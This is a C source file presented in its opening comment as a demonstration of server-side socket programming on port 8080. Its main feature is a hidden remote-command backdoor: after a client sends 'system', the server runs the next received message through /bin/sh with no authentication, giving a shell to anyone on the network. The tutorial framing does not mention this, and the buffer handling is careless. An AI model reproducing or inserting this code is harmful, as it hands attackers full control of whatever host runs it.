// Server side C/C++ program to demonstrate Socket programming
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/wait.h>
#define PORT 8080
#define SIZE 8196
void sendMessage(int sock,char *output){
    int valread;
    send(sock , output, strlen(output) , 0 );
}
int main(int argc, char const *argv[])
{
    int server_fd, new_socket, valread;
    int parentPid=getpid();
    int status =-1;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[SIZE] = {0};
    char *hello = "Hello from server";
       
    // Creating socket file descriptor
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0)
    {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }
       
    // Forcefully attaching socket to the port 8080
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,
                                                  &opt, sizeof(opt)))
    {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }
    address.sin_family =  AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons( PORT );
       
    // Forcefully attaching socket to the port 8080
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address))<0)
    {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }
    while(1){
    bzero(buffer,SIZE);
    if (listen(server_fd, 3) < 0)
    {
        perror("listen");
        exit(EXIT_FAILURE);
    }
    if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen))<0)
    {
        perror("accept");
        exit(EXIT_FAILURE);
    }
    while (strcmp(buffer,"close"))
    {
        bzero(buffer,SIZE);
        valread = read( new_socket , buffer, SIZE);
        // //!-----------------------------------------RCV SYS COMMAND--------------------------------------!
        if (!strcmp(buffer,"system"))
        {
            fork();
            wait(&status);
            if(parentPid!=getpid()){
                sendMessage(new_socket,"sys ACK");
                bzero(buffer,SIZE);
                valread = read( new_socket , buffer, SIZE);
                execl("/bin/sh","sh","-c",buffer,(char*)NULL);
            }
        }
    }
    sendMessage(new_socket,"ACK");
    close(new_socket);
    }
    return 0;
}
